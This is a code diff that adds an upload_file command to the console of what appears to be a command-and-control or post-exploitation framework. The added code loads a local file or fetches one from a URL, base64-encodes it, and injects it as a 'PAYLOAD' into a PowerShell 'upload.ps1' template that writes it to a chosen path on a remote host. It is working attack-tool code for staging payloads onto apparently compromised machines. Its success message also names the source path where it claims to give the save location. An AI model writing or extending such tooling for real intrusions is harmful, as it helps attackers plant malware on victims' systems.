@@ -183,7 +183,30 @@ class Cli:
             return ";"
         
     def upload_file(self, data):
-        pass
+        try:
+            cmd, path, remote = data.split(" ", 2)
+        except:
+            UI.error("Missing arguments")
+            return ";"
+        
+        data = ";"
+        if Utils.file_exists(path, False, False):
+            data = Utils.load_file_unsafe(path)
+        else:
+            data = Utils.download_url(path)     
+            
+        if not data == ";":
+            UI.success("Fetching %s" % path)
+            
+            data = base64.b64encode(data)
+            ps = Utils.load_powershell_script("upload.ps1", 3)
+            ps = Utils.update_key(ps, "PAYLOAD", data)
+            ps = Utils.update_key(ps, "PATH", remote)
+            UI.success("Payload will be saved at %s" % path)
+            return ps
+        else:
+            UI.error("Cannot fetch the resource")
+            return data
     
     def exec_code(self, data):
         try:
